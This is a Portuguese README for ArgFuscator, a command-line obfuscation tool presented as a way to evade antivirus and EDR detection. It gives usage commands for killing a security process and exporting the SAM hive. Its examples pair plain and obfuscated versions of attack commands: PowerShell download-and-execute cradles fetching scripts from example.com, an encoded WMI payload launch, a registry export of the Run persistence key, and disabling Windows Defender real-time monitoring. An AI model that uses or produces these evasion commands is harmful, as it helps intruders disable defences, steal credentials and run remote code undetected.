# ArgFuscator

ArgFuscator é uma ferramenta avançada de ofuscação de linha de comando para bypassing de detecções em AVs e EDRs. Esta ferramenta implementa técnicas shell-independentes que exploram as "falhas" de análise dos executáveis para contornar detecções baseadas em análises de linha de comando.

## Motivação

Ferramentas defensivas como AVs e EDRs dependem fortemente da análise de argumentos de linha de comando para detectar atividades maliciosas. Com o aumento significativo das "intrusões sem malware" nos últimos anos, onde atacantes utilizam:

- Linguagens de script nativas do sistema (PowerShell, Bash)
- Executáveis nativos do sistema (LOLBINs - Living Off The Land Binaries)
- Executáveis legítimos de terceiros (ferramentas de monitoramento e gerenciamento remoto)

A ofuscação de linha de comando torna-se uma técnica vital para compreender e defender contra estes tipos de ataques.

## Como funciona

A ofuscação de linha de comando difere de outros tipos de ofuscação (como DOSfuscation ou ofuscação PowerShell) porque:

1. Não é dependente do shell - é o executável alvo que é vulnerável
2. A linha de comando ofuscada é passada completamente ofuscada para o EDR

O ArgFuscator implementa várias técnicas de ofuscação, incluindo:

### Para Windows:
- Substituição de caracteres de opção (`/` → `-`)
- Substituição de caracteres (usando caracteres Unicode similares)
- Inserção de caracteres (caracteres invisíveis ou ignorados)
- Inserção de aspas
- Remoção de caracteres
- Transformação de valores (ex: IP em formato decimal)
- Travessia de caminho
- Manipulação de URL

### Para Linux/macOS:
- Remoção de caracteres
- Reordenação/empilhamento de opções
- Inserção e remoção de separadores de opção
- Transformação de valores

## Instalação

```bash
git clone https://github.com/seu-usuario/argfuscator.git
cd argfuscator
pip install -r requirements.txt
```

## Uso

```bash
python argfuscator.py "taskkill /f /im security_process.exe"
```

Gerar múltiplas variantes:
```bash
python argfuscator.py "reg export HKLM\SAM out.reg" --output 5
```

Usar técnicas específicas:
```bash
python argfuscator.py "powershell -encodedcommand ..." --techniques CharacterSubstitution,CharacterInsertion
```

Listar todas as técnicas disponíveis:
```bash
python argfuscator.py --list-techniques
```

## Exemplos de Ofuscação PowerShell

Aqui estão alguns exemplos de comandos PowerShell ofuscados usando o ArgFuscator:

### Exemplo 1: Execução de comandos codificados em Base64
Original:
```powershell
powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=
```

Ofuscado:
```powershell
poᵂeʳSʰEˡˡ -ᴱn<200b>ᶜoᵈᵉᵈᶜommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=
```

### Exemplo 2: Execução remota de script
Original:
```powershell
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"
```

Ofuscado:
```powershell
PoWeRsᴴEᵉLl -exᵉC<200c>utioⁿpo<200b>licy bʸₚA"S"s -WinDO"w"sᵗylᵉ hi"D"dEn -cOMM"a"Nd "IEX (New-Object Net.WebClient).DownloadString('http:\\example.com/script.ps1')"
```

### Exemplo 3: Uso do WMI para execução de processo
Original:
```powershell
wmic process call create "powershell -nop -w hidden -c IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('BASE64_ENCODED_PAYLOAD')))"
```

Ofuscado:
```powershell
wᵐ<200b>ᵢc pʳᴏc"e"Ss c<200c>A"l"L cʳ"e"ᵃᵗe "powershell -n"o"p -w hid"d"en -c IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('BASE64_ENCODED_PAYLOAD')))"
```

### Exemplo 4: Acesso ao registro do Windows
Original:
```powershell
reg export HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run persistence.reg
```

Ofuscado:
```powershell
REᴳ e"x"Poʳᵗ H"K"L"M"\S"O"FT"W"AR"E"\..\M"i"C"r"oSo"F"T\W"i"ND"o"W"s"\C"u"RR"e"NT"V"ERSᶦO"n"\RU"n" pe"r"Si"s"TᴱNce.reg
```

### Exemplo 5: Desativação do Windows Defender
Original:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Ofuscado:
```powershell
SeT-Mp<200b>PʳEᶠeʳeᴺcᵉ -dᶦSᵃᵇlᵉrᵉAlᵗim"e"m<200c>onitoʳiᴺᵍ $t"r"Ue
```

## Referências

- [LOLBAS Project](https://lolbas-project.github.io/)
- [ArgFuscator.net](https://argfuscator.net/)
- [Atomic Red Team](https://atomicredteam.io/)
